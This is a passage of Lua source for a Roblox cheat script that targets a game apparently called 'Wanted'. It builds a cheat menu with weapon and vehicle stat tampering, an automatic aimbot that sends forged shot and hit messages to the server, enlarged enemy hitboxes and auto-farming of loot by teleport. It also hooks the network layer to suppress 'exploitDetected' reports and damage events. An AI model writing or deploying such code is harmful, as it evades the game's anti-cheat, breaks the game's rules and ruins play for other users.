									end
								end

								fn114()

								Spawn(function()
									local v17 = nil

									while true do
										Wait(0.5)

										if tbl9.GunMod.Enabled then
											local toolId = ClientTools.GetLocalEquippedTool()
											toolId = toolId and toolId.toolId
											if toolId == v17 then
												continue
											end
											fn113()
											v17 = toolId
										else
											v17 = nil
										end
									end
								end)

								local gunMod = legit:CreateModule({
									Id = "wanted-gun-mod",
									Name = "Gun Mod",
									Default = false,
									Callback = function(arg)
										tbl9.GunMod.Enabled = arg == true
										fn113()
									end,
								})

								gunMod:CreateSlider({
									Id = "wanted-gun-mod-recoil",
									Name = "Recoil",
									Min = 0,
									Max = 100,
									Default = tbl9.GunMod.Recoil,
									Step = 1,
									Callback = function(recoil)
										tbl9.GunMod.Recoil = recoil

										if tbl9.GunMod.Enabled then
											fn113()
										end
									end,
								})

								gunMod:CreateSlider({
									Id = "wanted-gun-mod-spread",
									Name = "Spread",
									Min = 0,
									Max = 100,
									Default = tbl9.GunMod.Spread,
									Step = 1,
									Callback = function(spread)
										tbl9.GunMod.Spread = spread

										if tbl9.GunMod.Enabled then
											fn113()
										end
									end,
								})

								gunMod:CreateSlider({
									Id = "wanted-gun-mod-bullet-speed",
									Name = "Bullet Speed",
									Min = 0.1,
									Max = 100,
									Default = tbl9.GunMod.BulletSpeed,
									Step = 0.1,
									Callback = function(bulletSpeed)
										tbl9.GunMod.BulletSpeed = bulletSpeed

										if tbl9.GunMod.Enabled then
											fn113()
										end
									end,
								})

								gunMod:CreateSlider({
									Id = "wanted-gun-mod-bullet-lifetime",
									Name = "Bullet Lifetime",
									Min = 0.1,
									Max = 10,
									Default = tbl9.GunMod.BulletLifetime,
									Step = 0.1,
									Callback = function(bulletLifetime)
										tbl9.GunMod.BulletLifetime = bulletLifetime

										if tbl9.GunMod.Enabled then
											fn113()
										end
									end,
								})

								local tbl15 = { Enabled = false, Percent = {} }
								local tbl16 = { "Cars", "Motorcycles" }

								local tbl17 = {
									{ key = "TopSpeed", name = "Top Speed", path = { "topSpeed" } },
									{ key = "ReverseSpeed", name = "Top Reverse Speed", path = { "topReverseSpeed" } },
									{ key = "GasAccel", name = "Gas Acceleration", path = { "acceleration", "gas" } },
									{ key = "BrakeForce", name = "Brake Force", path = { "acceleration", "brake" } },
									{ key = "Handbrake", name = "Handbrake", path = { "acceleration", "handbrake" } },
									{ key = "GearBoost", name = "Gear Boost", path = { "gearBoost" } },
									{ key = "FinalDrive", name = "Final Drive Ratio", path = { "finalDriveRatio" } },
									{ key = "MaxRPM", name = "Max RPM", path = { "maxRPM" } },
									{ key = "ShiftRatio", name = "Shift Ratio", path = { "shiftRatio" } },
									{ key = "ShiftTime", name = "Shift Time", path = { "shiftTime" } },
									{ key = "TurboBoost", name = "Turbo Boost", path = { "turboBoost" } },
									{ key = "TurboLag", name = "Turbo Lag", path = { "turboLag" } },
									{ key = "Drag", name = "Drag", path = { "drag" } },
									{ key = "Downforce", name = "Downforce", path = { "downforce" } },
									{
										key = "SteerMax",
										name = "Steering Max Angle",
										path = { "steering", "maxAngle" },
									},
									{
										key = "SteerMin",
										name = "Steering Min Angle",
										path = { "steering", "minAngle" },
									},
									{ key = "SteerSpeed", name = "Steering Speed", path = { "steering", "speed" } },
									{
										key = "SteerModifier",
										name = "Steering Modifier",
										path = { "steering", "modifier" },
									},
									{
										key = "SteerHandbrake",
										name = "Steering Handbrake Scale",
										path = { "steering", "handbrakeScale" },
									},
									{
										key = "SusStiffness",
										name = "Suspension Stiffness",
										path = { "suspension", "stiffness" },
									},
									{
										key = "SusDamping",
										name = "Suspension Damping",
										path = { "suspension", "damping" },
									},
									{ key = "RideFront", name = "Ride Height Front", path = { "rideHeight", "front" } },
									{ key = "RideRear", name = "Ride Height Rear", path = { "rideHeight", "rear" } },
									{ key = "AntiRoll", name = "Anti Roll", path = { "antiRoll" } },
									{ key = "Camber", name = "Camber", path = { "camber" } },
									{
										key = "WeightFriction",
										name = "Weight Friction",
										path = { "weight", "friction" },
									},
									{ key = "WeightAxle", name = "Weight Axle", path = { "weight", "axle" } },
									{ key = "WeightChassis", name = "Weight Chassis", path = { "weight", "chassis" } },
									{ key = "WeightEngine", name = "Weight Engine", path = { "weight", "engine" } },
									{
										key = "MaxHealthChassis",
										name = "Max Health Chassis",
										path = { "maxHealth", "chassis" },
									},
									{ key = "MaxHealthTire", name = "Max Health Tire", path = { "maxHealth", "tire" } },
									{
										key = "MaxHealthWindow",
										name = "Max Health Window",
										path = { "maxHealth", "window" },
									},
									{ key = "ArmorChassis", name = "Armor Chassis", path = { "armor", "chassis" } },
									{ key = "ArmorTire", name = "Armor Tire", path = { "armor", "tire" } },
									{ key = "ArmorWindow", name = "Armor Window", path = { "armor", "window" } },
									{ key = "LeanAngle", name = "Lean Angle", path = { "leanAngle" } },
									{ key = "WheelieAngle", name = "Wheelie Angle", path = { "wheelieAngle" } },
									{ key = "FrontAngle", name = "Front Angle", path = { "frontAngle" } },
									{ key = "SlopeTorque", name = "Slope Torque Scale", path = { "slopeTorqueScale" } },
								}

								for i = 1, #tbl17 do
									tbl15.Percent[tbl17[i].key] = 100
								end

								local vehicles = ReplicatedStorage
									and FindFirstChild(ReplicatedStorage, "Shared")
									and FindFirstChild(ReplicatedStorage.Shared, "Wanted")
									and FindFirstChild(ReplicatedStorage.Shared.Wanted, "Indicies")
									and FindFirstChild(ReplicatedStorage.Shared.Wanted.Indicies, "Objects")
									and FindFirstChild(ReplicatedStorage.Shared.Wanted.Indicies.Objects, "Vehicles")

								local tbl18 = {}
								local tbl19 = {}
								local flag4 = false

								local function fn115(arg, arg2)
									if type(setreadonly) ~= "function" then
										return
									end
									pcall(setreadonly, arg, false)

									for i = 1, #arg2 do
										arg = arg[arg2[i]]
										if type(arg) == "table" then
											pcall(setreadonly, arg, false)
											continue
										end
										break
									end
								end

								local function fn116(arg, arg2)
									for i = 1, #arg2 do
										arg = arg and arg[arg2[i]]
										if type(arg) ~= "table" and i < #arg2 then
											return nil
										end
									end

									return type(arg) == "number" and arg or nil
								end

								local function fn117(arg, arg2, arg3)
									pcall(setreadonly, arg, false)

									for i = 1, #arg2 - 1 do
										local v17 = arg[arg2[i]]

										if type(v17) == "table" then
											arg = v17
										else
											local tbl20 = {}
											arg[arg2[i]] = tbl20
											arg = tbl20
										end

										pcall(setreadonly, arg, false)
									end

									if type(arg[arg2[#arg2]]) == "number" then
										arg[arg2[#arg2]] = arg3
										return true
									end
									return false
								end

								local function fn118()
									if flag4 then
										return
									end
									table.clear(tbl18)
									table.clear(tbl19)

									if vehicles then
										for i = 1, #tbl16 do
											local v17 = FindFirstChild(vehicles, tbl16[i])

											if v17 then
												for i2 = 1, #GetChildren(v17) do
													local v18 = GetChildren(v17)[i2]

													if IsA(v18, "ModuleScript") then
														local ok5, result5 = pcall(require, v18)

														if ok5 and type(result5) == "table" then
															Insert(tbl18, v18)
															local tbl20 = {}

															for i3 = 1, #tbl17 do
																local v19 = tbl17[i3]
																fn115(result5, v19.path)
																local v20 = fn116(result5, v19.path)

																if type(v20) == "number" then
																	tbl20[v19.key] = v20
																end
															end

															tbl19[v18.Name] = tbl20
														end
													end
												end
											end
										end
									end

									flag4 = true
								end

								local function fn119(arg, arg2)
									local v17 = tbl19[arg2]
									if not v17 then
										return
									end

									for i = 1, #tbl17 do
										local v18 = tbl17[i]
										local v19 = v17[v18.key]
										local n12 = tbl15.Percent[v18.key] or 100

										if type(v19) == "number" then
											fn117(arg, v18.path, v19 * n12 / 100)
										end
									end
								end

								local function fn120()
									fn118()

									for i = 1, #tbl18 do
										local v17 = tbl18[i]
										local ok5, result5 = pcall(require, v17)

										if ok5 and type(result5) == "table" then
											fn119(result5, v17.Name)
										end
									end
								end

								local function fn121()
									fn118()

									for i = 1, #tbl18 do
										local v17 = tbl18[i]
										local ok5, result5 = pcall(require, v17)

										if ok5 and type(result5) == "table" then
											local v18 = tbl19[v17.Name]

											if v18 then
												for i2 = 1, #tbl17 do
													local v19 = tbl17[i2]

													if type(v18[v19.key]) == "number" then
														fn117(result5, v19.path, v18[v19.key])
													end
												end
											end
										end
									end
								end

								local function fn122(arg)
									return type(arg) == "table"
										and arg.itemType == "Vehicle"
										and type(arg.name) == "string"
								end

								local function fn123()
									local getData2 = Objects.GetData
									if type(getData2) ~= "function" then
										return
									end

									Objects.GetData = function(arg, arg2, ...)
										local v17 = table.pack(...)
										local v18 = getData2
										v17.n = 3 + v17.n - 1
										table.move(v17, 1, v17.n, 3, v17)
										v17[1] = arg
										v17[2] = arg2
										local v19 = v18(table.unpack(v17, 1, v17.n))

										if tbl15.Enabled and fn122(v19) and tbl19[v19.name] then
											fn119(v19, v19.name)
										end

										return v19
									end
								end

								fn123()

								local carMod = legit:CreateModule({
									Id = "wanted-car-mod",
									Name = "Car Mod",
									Default = tbl15.Enabled,
									Callback = function(arg)
										tbl15.Enabled = arg == true

										if tbl15.Enabled then
											fn118()
											fn120()
										else
											fn121()
										end
									end,
								})

								for i = 1, #tbl17 do
									local v17 = tbl17[i]
									local key = v17.key

									carMod:CreateSlider({
										Id = "wanted-car-mod-" .. key:lower(),
										Name = v17.name,
										Min = 0,
										Max = 5000,
										Default = tbl15.Percent[key],
										Step = 1,
										Callback = function(arg)
											tbl15.Percent[key] = arg

											if tbl15.Enabled then
												fn120()
											end
										end,
									})
								end
							end

							fn90()
							local rage = window:CreateTab({ Id = "wanted-rage", Name = "Rage" })
							local tbl9 = {}
							local n6 = 0

							RageState = {
								AutoEquip = { Enabled = false, Item = "None" },
								Ragebot = {
									Enabled = false,
									Wallbang = true,
									Ignore = { Crawling = true, Knocked = true, Grabbed = true },
								},
								Finish_ArrestAura = false,
								SaveAura = false,
								Hitbox = { Enabled = false, Part = "Head", Size = 5 },
							}

							local function fn91()
								if not autoEquipSelector then
									return
								end
								local v10 = fn75()
								local item = RageState.AutoEquip.Item

								if item ~= "None" and not Find(v10, item) then
									item = "None"
								end

								RageState.AutoEquip.Item = item
								autoEquipSelector.Options = v10
								autoEquipSelector:Set(item, true)
							end

							local function fn92(arg, arg2)
								arg = arg and arg.plr
								if not arg or not fn72(nil, arg) then
									return false
								end
								local v10 = fn76(arg)
								local flag = not (arg2.Crawling and v10.isCrawling)

								if flag then
									flag = not (arg2.Knocked and v10.isKnocked)
								end

								if flag then
									flag = not (arg2.Grabbed and v10.isGrabbed)
								end

								return flag
							end

							local function fn93()
								for k, v10 in pairs(tbl9) do
									if k and k.Parent and v10 then
										k.Size = v10.Size
										k.Transparency = v10.Transparency
										k.CanCollide = v10.CanCollide
									end
								end

								table.clear(tbl9)
							end

							local v10 = nil

							local function fn94(arg)
								if v10 ~= arg then
									v10 = arg
									fn93()
								end

								local v11 = fn80()

								for i = 1, #v11 do
									local v12 = v11[i]

									if fn72(nil, v12.plr) then
										local hrp = v12.hrp
										local head = v12.head

										if not tbl9[hrp] or not tbl9[head] then
											tbl9[hrp] = {
												Size = hrp.Size,
												Transparency = hrp.Transparency,
												CanCollide = hrp.CanCollide,
											}

											tbl9[head] = {
												Size = head.Size,
												Transparency = head.Transparency,
												CanCollide = head.CanCollide,
											}
										end

										if arg == "Head" then
											head.Size = NewVector3(
												RageState.Hitbox.Size,
												RageState.Hitbox.Size,
												RageState.Hitbox.Size
											)

											head.Transparency = 0.8
											head.CanCollide = false
										else
											hrp.Size = NewVector3(
												RageState.Hitbox.Size,
												RageState.Hitbox.Size,
												RageState.Hitbox.Size
											)

											hrp.Transparency = 0.8
											hrp.CanCollide = false
										end
									end
								end
							end

							local function fn95()
								local currentTeam = GetAttribute(LocalPlayer, "currentTeam")
								local v11 = fn80()

								for i = 1, #v11 do
									local plr = v11[i].plr

									if fn76(plr).isDowned then
										local currentTeam2 = GetAttribute(plr, "currentTeam")

										if RageState.Finish_ArrestAura and currentTeam ~= currentTeam2 then
											if currentTeam == "police" then
												fireServer("arrest", plr.UserId)
											else
												fireServer("finish", plr.UserId)
											end

											continue
										end

										if RageState.SaveAura then
											if CheckState(plr) then
												return
											end
											fireServer("revive", plr.UserId)
										end
									end
								end
							end

							local function fn96()
								local now = tick()
								if now - n6 < 0.08 then
									return
								end
								local v11 = fn69()
								local v12 = fn71()
								local head2 = v11 and FindFirstChild(v11, "Head")
								local v13 = ClientTools.GetLocalEquippedTool()
								local toolState = v13 and v13.toolState
								if not head2 or not v12 or not v13 or not toolState then
									return
								end

								if (toolState.ammo or 0) <= 0 then
									if (toolState.totalAmmo or 0) > 0 then
										fireServer("reload", v13.toolId)
										fireServer("chamber", v13.toolId)
									end

									return
								end

								local v14 = fn77(RageState.Ragebot.Ignore)
								local v15 = fn80()

								for i = 1, #v15 do
									local v16 = v15[i]

									if fn92(v16, v14) then
										local head = v16.head
										local position, position2, flag

										if RageState.Ragebot.Wallbang then
											position, position2, flag = Resolve(v12, head, 30, head.Size.Magnitude)
										else
											position = head2.Position
											position2 = head.Position
											flag = true
										end

										position2 = position and position2
										flag = position2 and flag

										if flag then
											local v17 = nuid()
											local position3 = head.Position
											local n7 = position3 - position
											local unit = n7.Magnitude > 0.0001 and n7.Unit or v12.CFrame.LookVector

											local headHitbox = FindFirstChild(v16.char, "Hitbox")
													and FindFirstChild(v16.char.Hitbox, "Head_Hitbox")
												or head

											local position4 = head2.Position
											local magnitude = (position3 - position4).Magnitude

											local muzzleVelocity = v13
												and v13.projectile
												and v13.projectile.muzzleVelocity

											local n8 = type(muzzleVelocity) == "number"
													and muzzleVelocity > 0
													and muzzleVelocity / 0.28
												or 1600

											fireServer(
												"shoot",
												v13.toolId,
												MathUtil.CompressCFrame(NewCFrame(position4, position3)),
												{ { v17, MathUtil.CompressCFrame(NewCFrame(position4, position3)) } }
											)

											fireServer("registerProjectileHits", v17, v13.toolId, {
												{
													massLimit = 5,
													hit = headHitbox,
													position = position3,
													normal = -unit,
													material = headHitbox and headHitbox.Material
														or Enum.Material.Plastic,
													distance = magnitude,
													collisionPoint = position3,
													direction = unit,
													speed = n8,
													source = {
														sourceType = "Bullet",
														sourceId = v17,
														sourceToolId = v13.toolId,
														sourcePlayerId = userId,
													},
												},
											})

											CreateTracer(position, position3, nil, true)
											CreateHitSound()
											toolState.ammo = toolState.ammo - 1
											n6 = now
											break
										end
									end
								end
							end

							local function fn97()
								if rageLoop then
									Cancel(rageLoop)
								end

								rageLoop = Spawn(function()
									while Wait(0.05) do
										if RageState.AutoEquip.Enabled and RageState.AutoEquip.Item ~= "None" then
											local v11 = fn74(RageState.AutoEquip.Item)

											if v11 then
												fn73(v11.guid)
											end
										end

										if RageState.Ragebot.Enabled then
											fn96()
										end

										if RageState.Hitbox.Enabled then
											fn94(RageState.Hitbox.Part)
										end

										if RageState.Finish_ArrestAura or RageState.SaveAura then
											fn95()
										end
									end
								end)
							end

							local autoEquip = rage:CreateModule({
								Id = "wanted-auto-equip",
								Name = "Auto Equip",
								Default = RageState.AutoEquip.Enabled,
								Callback = function(enabled)
									RageState.AutoEquip.Enabled = enabled
								end,
							})

							autoEquip:CreateKeybind({
								Id = "w-auto-equip-keybind",
								Name = "Keybind",
								Callback = function()
									autoEquip:Set(not autoEquip:Get())
								end,
							})

							autoEquipSelector = autoEquip:CreateSelector({
								Id = "w-auto-equip-item",
								Name = "Item",
								Options = fn75(),
								Default = RageState.AutoEquip.Item,
								Callback = function(item)
									RageState.AutoEquip.Item = item
								end,
							})

							autoEquip:CreateButton({ Id = "w-refresh-items", Name = "Refresh Items", Callback = fn91 })

							local ragebot = rage:CreateModule({
								Id = "wanted-ragebot",
								Name = "Ragebot",
								Default = RageState.Ragebot.Enabled,
								Callback = function(enabled)
									RageState.Ragebot.Enabled = enabled
								end,
							})

							ragebot:CreateKeybind({
								Id = "w-ragebot-keybind",
								Name = "Keybind",
								Callback = function()
									ragebot:Set(not ragebot:Get())
								end,
							})

							ragebot:CreateToggle({
								Id = "w-wallbang",
								Name = "Wallbang",
								Default = RageState.Ragebot.Wallbang,
								Callback = function(wallbang)
									RageState.Ragebot.Wallbang = wallbang
								end,
							})

							ragebot:CreateToggle({
								Id = "w-ignore-crawling",
								Name = "Ignore Crawling",
								Default = RageState.Ragebot.Ignore.Crawling,
								Callback = function(crawling)
									RageState.Ragebot.Ignore.Crawling = crawling
								end,
							})

							ragebot:CreateToggle({
								Id = "w-ignore-knocked",
								Name = "Ignore Knocked",
								Default = RageState.Ragebot.Ignore.Knocked,
								Callback = function(knocked)
									RageState.Ragebot.Ignore.Knocked = knocked
								end,
							})

							ragebot:CreateToggle({
								Id = "w-ignore-grabbed",
								Name = "Ignore Grabbed",
								Default = RageState.Ragebot.Ignore.Grabbed,
								Callback = function(grabbed)
									RageState.Ragebot.Ignore.Grabbed = grabbed
								end,
							})

							local finishArrestAura = rage:CreateModule({
								Id = "wanted-finish-arrest-aura",
								Name = "Finish/ArrestAura",
								Default = RageState.Finish_ArrestAura,
								Callback = function(finishArrestAura)
									RageState.Finish_ArrestAura = finishArrestAura
								end,
							})

							finishArrestAura:CreateKeybind({
								Id = "w-finish-arrest-keybind",
								Name = "Keybind",
								Callback = function()
									finishArrestAura:Set(not finishArrestAura:Get())
								end,
							})

							local saveAura = rage:CreateModule({
								Id = "wanted-save-aura",
								Name = "Save Aura",
								Default = RageState.SaveAura,
								Callback = function(saveAura)
									RageState.SaveAura = saveAura
								end,
							})

							saveAura:CreateKeybind({
								Id = "w-save-aura-keybind",
								Name = "Keybind",
								Callback = function()
									saveAura:Set(not saveAura:Get())
								end,
							})

							local hitbox = rage:CreateModule({
								Id = "wanted-hitbox",
								Name = "Hitbox",
								Default = RageState.Hitbox.Enabled,
								Callback = function(enabled)
									RageState.Hitbox.Enabled = enabled

									if not enabled then
										fn93()
									end
								end,
							})

							hitbox:CreateKeybind({
								Id = "w-hitbox-keybind",
								Name = "Keybind",
								Callback = function()
									hitbox:Set(not hitbox:Get())
								end,
							})

							hitbox:CreateSelector({
								Id = "w-hitbox-part",
								Name = "Part",
								Options = { { Value = "Head" }, { Value = "Body" } },
								Default = RageState.Hitbox.Part,
								Callback = function(part)
									RageState.Hitbox.Part = part
								end,
							})

							hitbox:CreateSlider({
								Id = "w-hitbox-size",
								Name = "Size",
								Min = 1,
								Max = 30,
								Default = RageState.Hitbox.Size,
								Step = 1,
								Callback = function(size)
									RageState.Hitbox.Size = size
								end,
							})

							fn91()
							fn97()
							local farm = window:CreateTab({ Id = "wanted-farm", Name = "Farm" })
							local tween = nil
							local thread = nil
							local tbl10 = {}
							local cframe = NewCFrame(-387, 612, -1194)
							local cframe2 = NewCFrame(-3139, 36, 1638)
							local cframe3 = NewCFrame(212.04666, 39.775333, -2917.91455)
							local cframe4 = NewCFrame(-1677.875, 181.219955, 3336.449707)
							local cframe5 = NewCFrame(-490.56213, 128.077621, -1677.27356)
							local cframe6 = NewCFrame(-940.75396, 73.954681, -1541.64379)
							local newCFrame = NewCFrame
							tbl10[1] = cframe
							tbl10[2] = cframe2
							tbl10[3] = cframe3
							tbl10[4] = cframe4
							tbl10[5] = cframe5
							tbl10[6] = cframe6

							do
								local values = table.pack(newCFrame(-484.20837, 44.178874, -1956.65234))
								table.move(values, 1, values.n, 7, tbl10)
							end

							local tbl11 = {
								FarmAura = {
									Enabled = false,
									Options = {
										"GasStationSafe",
										"ATM",
										"Register",
										"Lootable",
										"WorldItem",
										"WorldBag",
										"MainCashPile",
										"CashPallet",
										"Cash",
										"MilitaryChest",
										"PelicanCase",
										"WorldSafe",
										"PC Block",
										"WorldItemSpawn",
										"Break Glass",
									},
								},
								AutoFarm = {
									Enabled = false,
									Options = {
										"GasStationSafe",
										"ATM",
										"Register",
										"Lootable",
										"WorldItem",
										"WorldBag",
										"MainCashPile",
										"CashPallet",
										"Cash",
										"MilitaryChest",
										"PelicanCase",
										"WorldSafe",
										"PC Block",
										"WorldItemSpawn",
									},
								},
							}

							local tbl12 = nil
							local flag = false

							local function fn98(arg)
								if not flag then
									tbl12 = {}
									flag = true
									local fn99 = nil

									fn99 = function(arg2)
										local children = GetChildren(arg2)

										for i = 1, #children do
											local v11 = children[i]

											if IsA(v11, "ModuleScript") then
												local ok4, result4 = pcall(require, v11)

												if
													ok4
													and type(result4) == "table"
													and result4.name
													and type(result4.sellValue) == "number"
												then
													tbl12[result4.name] = result4.sellValue
												end
											elseif IsA(v11, "Folder") then
												fn99(v11)
											end
										end
									end

									pcall(
										fn99,
										ReplicatedStorage.Shared.Wanted.Indicies.Objects.Gizmos.Pickups.Lootable
									)
								end

								return tbl12[arg]
							end

							local function fn99(arg)
								if fn81(arg) then
									local v11 = fn82(arg)
									if type(v11) == "number" then
										return v11
									end
								end

								local sellValue = arg and arg.sellValue

								if type(sellValue) ~= "number" then
									sellValue = fn98(arg and arg.name)
								end

								return sellValue or 0
							end

							local function fn100(arg)
								return fn84(arg)
							end

							local function fn101(arg, arg2, arg3)
								if not fn100(arg) or not fn78(arg2, arg.gizmoType) then
									return false
								end

								if fn85(arg) and not arg3 then
									return false
								end
								return true
							end

							local function fn102()
								if tween then
									tween:Cancel()
									tween = nil
								end
							end

							local function fn103(arg)
								return TweenInfo.new(arg, Enum.EasingStyle.Linear, Enum.EasingDirection.InOut)
							end

							local function fn104(arg, arg2, arg3)
								fn102()
								tween = TweenService:Create(arg, arg2, arg3)
								tween:Play()
								tween.Completed:Wait()
								tween = nil
							end

							local function fn105()
								local v11 = fn71()
								if not v11 then
									return
								end
								local flag2 = fn74("Buzzsaw") ~= nil

								if fn78(tbl11.FarmAura.Options, "Break Glass") and flag2 then
									local v12 = fn86(v11, 10)

									if v12 then
										fn87(v12)
									end
								end

								local tbl13 = {}
								local tbl14 = {}
								local v12 = next
								local v13, v14 = fn79(v11)

								for _, v15 in v12, v13, v14 do
									if v15.dist < n5 and fn101(v15, tbl11.FarmAura.Options, flag2) then
										if fn81(v15) then
											Insert(tbl14, v15)
										else
											Insert(tbl13, v15)
										end
									end
								end

								for i = 1, #tbl14 do
									fn83(tbl14[i])
								end

								Sort(tbl13, function(arg, arg2)
									local v15 = fn99(arg)
									local v16 = fn99(arg2)
									if v15 ~= v16 then
										return v15 > v16
									end
									return arg.dist < arg2.dist
								end)

								for i = 1, Min(3, #tbl13) do
									local v15 = tbl13[i]

									if fn85(v15) then
										local v16 = fn86(v11, 10)

										if v16 then
											fn87(v16)
										end
									end

									fn83(v15)
								end
							end

							local function fn106()
								local v11 = fn71()
								local hasLootBag = GetAttribute(LocalPlayer, "hasLootBag")
								local n7 = 0

								pcall(function()
									n7 = DialogUtil.GetBagSellValue() or 0
								end)

								if not v11 or not hasLootBag and n7 <= 0 then
									return false
								end
								fn104(v11, fn103(1), { CFrame = v11.CFrame + NewVector3(0, 150, 0) })
								if not tbl11.AutoFarm.Enabled then
									return true
								end
								local v12 = fn71()
								if not v12 then
									return true
								end
								local vector = NewVector3(-2826, v12.Position.Y, 1738)

								fn104(
									v12,
									fn103((v12.Position - vector).Magnitude / 100),
									{ CFrame = NewCFrame(vector) }
								)

								if not tbl11.AutoFarm.Enabled then
									return true
								end
								local v13 = fn71()
								if not v13 then
									return true
								end
								fn104(v13, fn103(3), { CFrame = NewCFrame(-2826, 37, 1738) })
								pcall(invokeServer, "sellLoot", "Ofy")
								return true
							end

							local function fn107()
								local v11 = fn71()
								local v12 = fn70()
								if not v11 or not v12 then
									return
								end
								fn106()
								if not tbl11.AutoFarm.Enabled then
									return
								end
								local v13 = fn71()
								if not v13 then
									return
								end
								local v14 = tbl10[Random(1, #tbl10)]
								fn104(v13, fn103(1), { CFrame = v13.CFrame + NewVector3(0, 150, 0) })
								if not tbl11.AutoFarm.Enabled then
									return
								end
								local v15 = fn71()
								if not v15 then
									return
								end
								local vector = NewVector3(v14.X, v15.Position.Y, v14.Z)

								fn104(
									v15,
									fn103((v15.Position - vector).Magnitude / 100),
									{ CFrame = NewCFrame(vector) }
								)

								local v16 = fn71()
								if not v16 then
									return
								end
								local flag2 = fn74("Buzzsaw") ~= nil
								local tbl13 = {}
								local v17 = next
								local v18, v19 = fn79(v16)

								for _, v20 in v17, v18, v19 do
									if fn101(v20, tbl11.AutoFarm.Options, flag2) then
										Insert(tbl13, v20)
									end
								end

								Sort(tbl13, function(arg, arg2)
									local v20 = fn99(arg)
									local v21 = fn99(arg2)
									if v20 ~= v21 then
										return v20 > v21
									end
									return arg.dist < arg2.dist
								end)

								for i = 1, #tbl13 do
									local v20 = tbl13[i]

									if tbl11.AutoFarm.Enabled then
										if fn89() then
											fn106()
											break
										else
											local v21 = fn71()

											if v21 then
												local cframe7 = v20.cframe and v20.cframe * NewCFrame(0, 1, -1)
													or NewCFrame(v20.position)

												fn104(
													v21,
													fn103(Max((v21.Position - cframe7.Position).Magnitude / 60, 0.05)),
													{ CFrame = cframe7 }
												)

												local gizmoType, flag3, n7

												if fn85(v20) then
													if not flag2 then
														continue
													else
														local v22 = fn86(v21, 12)

														if v22 then
															fn87(v22)
															Wait(0.35)
															fn83(v20)
															gizmoType = v20.gizmoType
															flag3 = gizmoType == "ATM" or gizmoType == "Register"
															n7 = 0.6

															if flag3 then
																n7 = 2.5
															end

															Wait(n7)

															if fn89() then
																fn106()
																break
															else
																continue
															end
														else
															fn83(v20)
															gizmoType = v20.gizmoType
															flag3 = gizmoType == "ATM" or gizmoType == "Register"
															n7 = 0.6

															if flag3 then
																n7 = 2.5
															end

															Wait(n7)

															if fn89() then
																fn106()
																break
															else
																continue
															end
														end
													end
												else
													fn83(v20)
													gizmoType = v20.gizmoType
													flag3 = gizmoType == "ATM" or gizmoType == "Register"
													n7 = 0.6

													if flag3 then
														n7 = 2.5
													end

													Wait(n7)

													if fn89() then
														fn106()
														break
													else
														continue
													end
												end
											end
										end
									end

									break
								end
							end

							local function fn108()
								if thread then
									return
								end

								thread = Spawn(function()
									while tbl11.AutoFarm.Enabled and Wait() do
										pcall(fn107)
									end

									fn102()
									thread = nil
								end)
							end

							Connect(RunService.Heartbeat, function()
								if tbl11.FarmAura.Enabled then
									fn105()
								end
							end)

							local function fn109(arg, arg2, arg3)
								if arg3 then
									if not Find(arg, arg2) then
										Insert(arg, arg2)
									end
								else
									for i = #arg, 1, -1 do
										if arg[i] == arg2 then
											Remove(arg, i)
										end
									end
								end
							end

							local tbl13 = {
								"GasStationSafe",
								"ATM",
								"Register",
								"Lootable",
								"WorldItem",
								"WorldBag",
								"MainCashPile",
								"CashPallet",
								"Cash",
								"MilitaryChest",
								"PelicanCase",
								"WorldSafe",
								"PC Block",
								"WorldItemSpawn",
							}

							local tbl14 = {
								"GasStationSafe",
								"ATM",
								"Register",
								"Lootable",
								"WorldItem",
								"WorldBag",
								"MainCashPile",
								"CashPallet",
								"Cash",
								"MilitaryChest",
								"PelicanCase",
								"WorldSafe",
								"PC Block",
								"WorldItemSpawn",
								"Break Glass",
							}

							local farmAura = farm:CreateModule({
								Id = "wanted-farm-aura",
								Name = "Farm Aura",
								Default = tbl11.FarmAura.Enabled,
								Callback = function(enabled)
									tbl11.FarmAura.Enabled = enabled
								end,
							})

							for i = 1, #tbl14 do
								local v11 = tbl14[i]

								farmAura:CreateToggle({
									Id = "w-fa-" .. Lower(v11:gsub("%s+", "-")),
									Name = v11,
									NameKey = "w_fa_" .. Lower(v11:gsub("%s+", "_")),
									Default = Find(tbl11.FarmAura.Options, v11) ~= nil,
									Callback = function(arg)
										fn109(tbl11.FarmAura.Options, v11, arg)
									end,
								})
							end

							local autoFarm = farm:CreateModule({
								Id = "wanted-auto-farm",
								Name = "Auto Farm",
								Default = tbl11.AutoFarm.Enabled,
								Callback = function(enabled)
									tbl11.AutoFarm.Enabled = enabled

									if enabled then
										fn108()
									else
										fn102()
									end
								end,
							})

							for i = 1, #tbl13 do
								local v11 = tbl13[i]

								autoFarm:CreateToggle({
									Id = "w-af-" .. Lower(v11:gsub("%s+", "-")),
									Name = v11,
									NameKey = "w_af_" .. Lower(v11:gsub("%s+", "_")),
									Default = Find(tbl11.AutoFarm.Options, v11) ~= nil,
									Callback = function(arg)
										fn109(tbl11.AutoFarm.Options, v11, arg)
									end,
								})
							end

							local wantedMisc = window:CreateTab({ Id = "wanted-misc", Name = "Wanted Misc" })

							local tbl15 =
								{ NoVehicleHits = true, NoBankGas = true, NoBankTripLaser = true, NoRagdoll = true }

							wantedMisc:CreateModule({
								Id = "wanted-no-vehicle-hits",
								Name = "No Vehicle Hits",
								Default = tbl15.NoVehicleHits,
								Callback = function(noVehicleHits)
									tbl15.NoVehicleHits = noVehicleHits
								end,
							})

							wantedMisc:CreateModule({
								Id = "wanted-no-bank-gas",
								Name = "No Bank Gas",
								Default = tbl15.NoBankGas,
								Callback = function(noBankGas)
									tbl15.NoBankGas = noBankGas
								end,
							})

							wantedMisc:CreateModule({
								Id = "wanted-no-bank-trip-laser",
								Name = "No Bank Trip Laser",
								Default = tbl15.NoBankTripLaser,
								Callback = function(noBankTripLaser)
									tbl15.NoBankTripLaser = noBankTripLaser
								end,
							})

							wantedMisc:CreateModule({
								Id = "wanted-no-ragdoll",
								Name = "No Ragdoll",
								Default = tbl15.NoRagdoll,
								Callback = function(noRagdoll)
									tbl15.NoRagdoll = noRagdoll
								end,
							})

							local fireServer2 = Network.FireServer

							Network.FireServer = function(arg, ...)
								local v11 = table.pack(...)

								if
									arg == "exploitDetected"
									or arg == "registerVehicleHits" and tbl15.NoVehicleHits
									or arg == "gassed" and tbl15.NoBankGas
									or arg == "tripLaser" and tbl15.NoBankTripLaser
									or arg == "setRagdoll" and ({ ... })[1] == true and tbl15.NoRagdoll
								then
									return
								end

								return fireServer2(arg, table.unpack(v11, 1, v11.n))
							end
						end,
					}

					local flag = false
					local placeId = game.PlaceId

					local tbl9 = {
						["Gun Grounds FFA"] = 12137249458,
						Ohio = { 7239319209, 11958318242 },
